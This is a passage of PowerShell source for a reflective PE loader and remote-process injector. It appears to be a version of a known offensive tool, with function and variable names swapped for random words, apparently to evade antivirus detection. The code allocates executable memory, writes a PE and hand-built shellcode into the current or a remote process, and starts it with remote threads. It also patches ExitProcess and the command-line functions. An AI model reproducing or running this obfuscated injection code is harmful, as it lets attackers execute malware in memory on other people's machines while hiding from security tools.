		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$EuQVwKhg99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$zAfvSIaE99
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$NTHVDavr99 = [IntPtr](palmettoes ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$zAfvSIaE99.IMAGE_SECTION_HEADER)))
			$NbRCvNCn99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NTHVDavr99, [Type]$zAfvSIaE99.IMAGE_SECTION_HEADER)
			[IntPtr]$CFIstjdk99 = palmettoes ($PEInfo.PEHandle) ($NbRCvNCn99.VirtualAddress)
			
			[UInt32]$cOqovyyJ99 = charity $NbRCvNCn99.Characteristics
			[UInt32]$bVDVNIuV99 = $NbRCvNCn99.VirtualSize
			
			[UInt32]$zIKUTaNe99 = 0
			irks -DebugString "sunspots::VirtualProtect" -PEInfo $PEInfo -StartAddress $CFIstjdk99 -Size $bVDVNIuV99 | Out-Null
			$HXKXgwOZ99 = $EuQVwKhg99.VirtualProtect.Invoke($CFIstjdk99, $bVDVNIuV99, $cOqovyyJ99, [Ref]$zIKUTaNe99)
			if ($HXKXgwOZ99 -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	Function watchdogs
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$EuQVwKhg99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$BQRxOmSH99,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$WbhViyZa99
		)
		
		$VBvwPTnq99 = @() 
		
		$ZtgTmrIJ99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$zIKUTaNe99 = 0
		
		[IntPtr]$XMdOXMeB99 = $EuQVwKhg99.GetModuleHandle.Invoke("Kernel32.dll")
		if ($XMdOXMeB99 -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$eRquzkUG99 = $EuQVwKhg99.GetModuleHandle.Invoke("KernelBase.dll")
		if ($eRquzkUG99 -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}
		$xHWrjCkf99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($BQRxOmSH99)
		$avEKdyIW99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($BQRxOmSH99)
	
		[IntPtr]$vGDkkpbh99 = $EuQVwKhg99.GetProcAddress.Invoke($eRquzkUG99, "GetCommandLineA")
		[IntPtr]$RyNCePtF99 = $EuQVwKhg99.GetProcAddress.Invoke($eRquzkUG99, "GetCommandLineW")
		if ($vGDkkpbh99 -eq [IntPtr]::Zero -or $RyNCePtF99 -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $vGDkkpbh99. GetCommandLineW: $RyNCePtF99"
		}
		[Byte[]]$bJZSyqZs99 = @()
		if ($ZtgTmrIJ99 -eq 8)
		{
			$bJZSyqZs99 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$bJZSyqZs99 += 0xb8
		
		[Byte[]]$UOapIeEe99 = @(0xc3)
		$BTwBbwvq99 = $bJZSyqZs99.Length + $ZtgTmrIJ99 + $UOapIeEe99.Length
		
		
		$lnHPmxws99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BTwBbwvq99)
		$APSiBgOJ99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BTwBbwvq99)
		$EuQVwKhg99.memcpy.Invoke($lnHPmxws99, $vGDkkpbh99, [UInt64]$BTwBbwvq99) | Out-Null
		$EuQVwKhg99.memcpy.Invoke($APSiBgOJ99, $RyNCePtF99, [UInt64]$BTwBbwvq99) | Out-Null
		$VBvwPTnq99 += ,($vGDkkpbh99, $lnHPmxws99, $BTwBbwvq99)
		$VBvwPTnq99 += ,($RyNCePtF99, $APSiBgOJ99, $BTwBbwvq99)
		[UInt32]$zIKUTaNe99 = 0
		$HXKXgwOZ99 = $EuQVwKhg99.VirtualProtect.Invoke($vGDkkpbh99, [UInt32]$BTwBbwvq99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$zIKUTaNe99)
		if ($HXKXgwOZ99 = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$BqIqHAdC99 = $vGDkkpbh99
		faculty -Bytes $bJZSyqZs99 -MemoryAddress $BqIqHAdC99
		$BqIqHAdC99 = palmettoes $BqIqHAdC99 ($bJZSyqZs99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($avEKdyIW99, $BqIqHAdC99, $false)
		$BqIqHAdC99 = palmettoes $BqIqHAdC99 $ZtgTmrIJ99
		faculty -Bytes $UOapIeEe99 -MemoryAddress $BqIqHAdC99
		
		$EuQVwKhg99.VirtualProtect.Invoke($vGDkkpbh99, [UInt32]$BTwBbwvq99, [UInt32]$zIKUTaNe99, [Ref]$zIKUTaNe99) | Out-Null
		
		
		[UInt32]$zIKUTaNe99 = 0
		$HXKXgwOZ99 = $EuQVwKhg99.VirtualProtect.Invoke($RyNCePtF99, [UInt32]$BTwBbwvq99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$zIKUTaNe99)
		if ($HXKXgwOZ99 = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$fEcceZHf99 = $RyNCePtF99
		faculty -Bytes $bJZSyqZs99 -MemoryAddress $fEcceZHf99
		$fEcceZHf99 = palmettoes $fEcceZHf99 ($bJZSyqZs99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($xHWrjCkf99, $fEcceZHf99, $false)
		$fEcceZHf99 = palmettoes $fEcceZHf99 $ZtgTmrIJ99
		faculty -Bytes $UOapIeEe99 -MemoryAddress $fEcceZHf99
		
		$EuQVwKhg99.VirtualProtect.Invoke($RyNCePtF99, [UInt32]$BTwBbwvq99, [UInt32]$zIKUTaNe99, [Ref]$zIKUTaNe99) | Out-Null
		
		
		$JrwVhzFc99 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $JrwVhzFc99)
		{
			[IntPtr]$VmYqEdYX99 = $EuQVwKhg99.GetModuleHandle.Invoke($Dll)
			if ($VmYqEdYX99 -ne [IntPtr]::Zero)
			{
				[IntPtr]$TFFBFPbj99 = $EuQVwKhg99.GetProcAddress.Invoke($VmYqEdYX99, "_wcmdln")
				[IntPtr]$fmQCKiAv99 = $EuQVwKhg99.GetProcAddress.Invoke($VmYqEdYX99, "_acmdln")
				if ($TFFBFPbj99 -eq [IntPtr]::Zero -or $fmQCKiAv99 -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$kLhdCZiK99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($BQRxOmSH99)
				$ZGsAWJsc99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($BQRxOmSH99)
				
				$FpXPRPVs99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($fmQCKiAv99, [Type][IntPtr])
				$QEirqrsR99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TFFBFPbj99, [Type][IntPtr])
				$bimvWIob99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ZtgTmrIJ99)
				$xgdfZHBL99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ZtgTmrIJ99)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($FpXPRPVs99, $bimvWIob99, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($QEirqrsR99, $xgdfZHBL99, $false)
				$VBvwPTnq99 += ,($fmQCKiAv99, $bimvWIob99, $ZtgTmrIJ99)
				$VBvwPTnq99 += ,($TFFBFPbj99, $xgdfZHBL99, $ZtgTmrIJ99)
				
				$HXKXgwOZ99 = $EuQVwKhg99.VirtualProtect.Invoke($fmQCKiAv99, [UInt32]$ZtgTmrIJ99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$zIKUTaNe99)
				if ($HXKXgwOZ99 = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($kLhdCZiK99, $fmQCKiAv99, $false)
				$EuQVwKhg99.VirtualProtect.Invoke($fmQCKiAv99, [UInt32]$ZtgTmrIJ99, [UInt32]($zIKUTaNe99), [Ref]$zIKUTaNe99) | Out-Null
				
				$HXKXgwOZ99 = $EuQVwKhg99.VirtualProtect.Invoke($TFFBFPbj99, [UInt32]$ZtgTmrIJ99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$zIKUTaNe99)
				if ($HXKXgwOZ99 = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($ZGsAWJsc99, $TFFBFPbj99, $false)
				$EuQVwKhg99.VirtualProtect.Invoke($TFFBFPbj99, [UInt32]$ZtgTmrIJ99, [UInt32]($zIKUTaNe99), [Ref]$zIKUTaNe99) | Out-Null
			}
		}
		
		
		$VBvwPTnq99 = @()
		$vAtxrfyp99 = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		[IntPtr]$kdeNaOcC99 = $EuQVwKhg99.GetModuleHandle.Invoke("mscoree.dll")
		if ($kdeNaOcC99 -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$sPwrxLlI99 = $EuQVwKhg99.GetProcAddress.Invoke($kdeNaOcC99, "CorExitProcess")
		if ($sPwrxLlI99 -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$vAtxrfyp99 += $sPwrxLlI99
		
		[IntPtr]$lKDmMTiS99 = $EuQVwKhg99.GetProcAddress.Invoke($XMdOXMeB99, "ExitProcess")
		if ($lKDmMTiS99 -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$vAtxrfyp99 += $lKDmMTiS99
		
		[UInt32]$zIKUTaNe99 = 0
		foreach ($lhAQoqOK99 in $vAtxrfyp99)
		{
			$rjAkCSHQ99 = $lhAQoqOK99
			[Byte[]]$bJZSyqZs99 = @(0xbb)
			[Byte[]]$UOapIeEe99 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if ($ZtgTmrIJ99 -eq 8)
			{
				[Byte[]]$bJZSyqZs99 = @(0x48, 0xbb)
				[Byte[]]$UOapIeEe99 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$YZPKYlQY99 = @(0xff, 0xd3)
			$BTwBbwvq99 = $bJZSyqZs99.Length + $ZtgTmrIJ99 + $UOapIeEe99.Length + $ZtgTmrIJ99 + $YZPKYlQY99.Length
			
			[IntPtr]$iBLpMcTh99 = $EuQVwKhg99.GetProcAddress.Invoke($XMdOXMeB99, "ExitThread")
			if ($iBLpMcTh99 -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}
			$HXKXgwOZ99 = $EuQVwKhg99.VirtualProtect.Invoke($lhAQoqOK99, [UInt32]$BTwBbwvq99, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$zIKUTaNe99)
			if ($HXKXgwOZ99 -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$rPXOKzif99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BTwBbwvq99)
			$EuQVwKhg99.memcpy.Invoke($rPXOKzif99, $lhAQoqOK99, [UInt64]$BTwBbwvq99) | Out-Null
			$VBvwPTnq99 += ,($lhAQoqOK99, $rPXOKzif99, $BTwBbwvq99)
			
			faculty -Bytes $bJZSyqZs99 -MemoryAddress $rjAkCSHQ99
			$rjAkCSHQ99 = palmettoes $rjAkCSHQ99 ($bJZSyqZs99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($WbhViyZa99, $rjAkCSHQ99, $false)
			$rjAkCSHQ99 = palmettoes $rjAkCSHQ99 $ZtgTmrIJ99
			faculty -Bytes $UOapIeEe99 -MemoryAddress $rjAkCSHQ99
			$rjAkCSHQ99 = palmettoes $rjAkCSHQ99 ($UOapIeEe99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($iBLpMcTh99, $rjAkCSHQ99, $false)
			$rjAkCSHQ99 = palmettoes $rjAkCSHQ99 $ZtgTmrIJ99
			faculty -Bytes $YZPKYlQY99 -MemoryAddress $rjAkCSHQ99
			$EuQVwKhg99.VirtualProtect.Invoke($lhAQoqOK99, [UInt32]$BTwBbwvq99, [UInt32]$zIKUTaNe99, [Ref]$zIKUTaNe99) | Out-Null
		}
		Write-Output $VBvwPTnq99
	}
	
	
	Function blunter
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$ogLyaXDy99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$EuQVwKhg99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]$zIKUTaNe99 = 0
		foreach ($Info in $ogLyaXDy99)
		{
			$HXKXgwOZ99 = $EuQVwKhg99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$zIKUTaNe99)
			if ($HXKXgwOZ99 -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$EuQVwKhg99.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$EuQVwKhg99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$zIKUTaNe99, [Ref]$zIKUTaNe99) | Out-Null
		}
	}
	Function forecast
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$EbqIceBD99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$zAfvSIaE99 = archeologists
		$Win32Constants = actress
		$PEInfo = nonconductor -PEHandle $EbqIceBD99 -Win32Types $zAfvSIaE99 -Win32Constants $Win32Constants
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$blzThecM99 = palmettoes ($EbqIceBD99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$kIxqzVWb99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($blzThecM99, [Type]$zAfvSIaE99.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $kIxqzVWb99.NumberOfNames; $i++)
		{
			$FKTLIros99 = palmettoes ($EbqIceBD99) ($kIxqzVWb99.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$vNBvrLRc99 = palmettoes ($EbqIceBD99) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($FKTLIros99, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($vNBvrLRc99)
			if ($Name -ceq $FunctionName)
			{
				$kTvnERHw99 = palmettoes ($EbqIceBD99) ($kIxqzVWb99.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$JiYVGSax99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($kTvnERHw99, [Type][UInt16])
				$FDLntmby99 = palmettoes ($EbqIceBD99) ($kIxqzVWb99.AddressOfFunctions + ($JiYVGSax99 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$uLRVSXGB99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FDLntmby99, [Type][UInt32])
				return palmettoes ($EbqIceBD99) ($uLRVSXGB99)
			}
		}
		
		return [IntPtr]::Zero
	}
	Function wanderers
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$xcecESTK99,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$UdqEmWRT99,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$ILaWeMxR99
		)
		
		$ZtgTmrIJ99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$Win32Constants = actress
		$EuQVwKhg99 = glorification
		$zAfvSIaE99 = archeologists
		
		$SnHSMpod99 = $false
		if (($ILaWeMxR99 -ne $null) -and ($ILaWeMxR99 -ne [IntPtr]::Zero))
		{
			$SnHSMpod99 = $true
		}
		
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = villainous -PEBytes $xcecESTK99 -Win32Types $zAfvSIaE99
		$AHMZvGpX99 = $PEInfo.OriginalImageBase
		$LkkxrWWc99 = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$LkkxrWWc99 = $false
		}
		
		
		$ljgyplbY99 = $true
		if ($SnHSMpod99 -eq $true)
		{
			$XMdOXMeB99 = $EuQVwKhg99.GetModuleHandle.Invoke("kernel32.dll")
			$BKfwcaqY99 = $EuQVwKhg99.GetProcAddress.Invoke($XMdOXMeB99, "IsWow64Process")
			if ($BKfwcaqY99 -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$NDWLDRLX99 = $false
			$HXKXgwOZ99 = $EuQVwKhg99.IsWow64Process.Invoke($ILaWeMxR99, [Ref]$NDWLDRLX99)
			if ($HXKXgwOZ99 -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($NDWLDRLX99 -eq $true) -or (($NDWLDRLX99 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$ljgyplbY99 = $false
			}
			
			$ubbZiVli99 = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$ubbZiVli99 = $false
			}
			if ($ubbZiVli99 -ne $ljgyplbY99)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$ljgyplbY99 = $false
			}
		}
		if ($ljgyplbY99 -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$JBDWsxRR99 = [IntPtr]::Zero
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$JBDWsxRR99 = $AHMZvGpX99
		}
		$EbqIceBD99 = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$qRjVJIhs99 = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $EbqIceBD99. If it is loaded in a remote process, this is the address in the remote process.
		if ($SnHSMpod99 -eq $true)
		{
			$EbqIceBD99 = $EuQVwKhg99.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			$qRjVJIhs99 = $EuQVwKhg99.VirtualAllocEx.Invoke($ILaWeMxR99, $JBDWsxRR99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($qRjVJIhs99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($LkkxrWWc99 -eq $true)
			{
				$EbqIceBD99 = $EuQVwKhg99.VirtualAlloc.Invoke($JBDWsxRR99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$EbqIceBD99 = $EuQVwKhg99.VirtualAlloc.Invoke($JBDWsxRR99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$qRjVJIhs99 = $EbqIceBD99
		}
		
		[IntPtr]$QQmhTCxH99 = palmettoes ($EbqIceBD99) ([Int64]$PEInfo.SizeOfImage)
		if ($EbqIceBD99 -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($xcecESTK99, 0, $EbqIceBD99, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = nonconductor -PEHandle $EbqIceBD99 -Win32Types $zAfvSIaE99 -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $QQmhTCxH99
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $qRjVJIhs99
		Write-Verbose "StartAddress: $EbqIceBD99    EndAddress: $QQmhTCxH99"
		
		
		Write-Verbose "Copy PE sections in to memory"
		disfranchise -PEBytes $xcecESTK99 -PEInfo $PEInfo -Win32Functions $EuQVwKhg99 -Win32Types $zAfvSIaE99
		
		
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		groomed -PEInfo $PEInfo -OriginalImageBase $AHMZvGpX99 -Win32Constants $Win32Constants -Win32Types $zAfvSIaE99
		
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($SnHSMpod99 -eq $true)
		{
			hierarchy -PEInfo $PEInfo -Win32Functions $EuQVwKhg99 -Win32Types $zAfvSIaE99 -Win32Constants $Win32Constants -RemoteProcHandle $ILaWeMxR99
		}
		else
		{
			hierarchy -PEInfo $PEInfo -Win32Functions $EuQVwKhg99 -Win32Types $zAfvSIaE99 -Win32Constants $Win32Constants
		}
		
		
		if ($SnHSMpod99 -eq $false)
		{
			if ($LkkxrWWc99 -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				sunspots -PEInfo $PEInfo -Win32Functions $EuQVwKhg99 -Win32Constants $Win32Constants -Win32Types $zAfvSIaE99
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		if ($SnHSMpod99 -eq $true)
		{
			[UInt32]$gIylziGQ99 = 0
			$HXKXgwOZ99 = $EuQVwKhg99.WriteProcessMemory.Invoke($ILaWeMxR99, $qRjVJIhs99, $EbqIceBD99, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$gIylziGQ99)
			if ($HXKXgwOZ99 -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($SnHSMpod99 -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$SgufstCa99 = palmettoes ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$wStdtpXm99 = cataleptic @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$ZIgcIefN99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SgufstCa99, $wStdtpXm99)
				
				$ZIgcIefN99.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$SgufstCa99 = palmettoes ($qRjVJIhs99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					$TbWXvzUO99 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$ixPTDKBd99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$HmWLdGcd99 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					$TbWXvzUO99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$ixPTDKBd99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$HmWLdGcd99 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$eUzjXOor99 = $TbWXvzUO99.Length + $ixPTDKBd99.Length + $HmWLdGcd99.Length + ($ZtgTmrIJ99 * 2)
				$NQwabgkC99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($eUzjXOor99)
				$fQELDiOg99 = $NQwabgkC99
				
				faculty -Bytes $TbWXvzUO99 -MemoryAddress $NQwabgkC99
				$NQwabgkC99 = palmettoes $NQwabgkC99 ($TbWXvzUO99.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($qRjVJIhs99, $NQwabgkC99, $false)
				$NQwabgkC99 = palmettoes $NQwabgkC99 ($ZtgTmrIJ99)
				faculty -Bytes $ixPTDKBd99 -MemoryAddress $NQwabgkC99
				$NQwabgkC99 = palmettoes $NQwabgkC99 ($ixPTDKBd99.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($SgufstCa99, $NQwabgkC99, $false)
				$NQwabgkC99 = palmettoes $NQwabgkC99 ($ZtgTmrIJ99)
				faculty -Bytes $HmWLdGcd99 -MemoryAddress $NQwabgkC99
				$NQwabgkC99 = palmettoes $NQwabgkC99 ($HmWLdGcd99.Length)
				
				$LpjVBbOG99 = $EuQVwKhg99.VirtualAllocEx.Invoke($ILaWeMxR99, [IntPtr]::Zero, [UIntPtr][UInt64]$eUzjXOor99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($LpjVBbOG99 -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$HXKXgwOZ99 = $EuQVwKhg99.WriteProcessMemory.Invoke($ILaWeMxR99, $LpjVBbOG99, $fQELDiOg99, [UIntPtr][UInt64]$eUzjXOor99, [Ref]$gIylziGQ99)
				if (($HXKXgwOZ99 -eq $false) -or ([UInt64]$gIylziGQ99 -ne [UInt64]$eUzjXOor99))
				{
					Throw "Unable to write shellcode to remote process memory."
				}
				$oxKACvse99 = splodge -ProcessHandle $ILaWeMxR99 -StartAddress $LpjVBbOG99 -Win32Functions $EuQVwKhg99
				$BKfwcaqY99 = $EuQVwKhg99.WaitForSingleObject.Invoke($oxKACvse99, 20000)
				if ($BKfwcaqY99 -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$EuQVwKhg99.VirtualFreeEx.Invoke($ILaWeMxR99, $LpjVBbOG99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			[IntPtr]$WbhViyZa99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($WbhViyZa99, 0, 0x00)
			$czcVSEAW99 = watchdogs -PEInfo $PEInfo -Win32Functions $EuQVwKhg99 -Win32Constants $Win32Constants -ExeArguments $UdqEmWRT99 -ExeDoneBytePtr $WbhViyZa99
			[IntPtr]$egbXfMXc99 = palmettoes ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $egbXfMXc99. Creating thread for the EXE to run in."
			$EuQVwKhg99.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $egbXfMXc99, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]$sOrcwCXw99 = [System.Runtime.InteropServices.Marshal]::ReadByte($WbhViyZa99, 0)
				if ($sOrcwCXw99 -eq 1)
				{
					blunter -CopyInfo $czcVSEAW99 -Win32Functions $EuQVwKhg99 -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $qRjVJIhs99)
	}
	
	
	Function discountenances
	{
		Param(
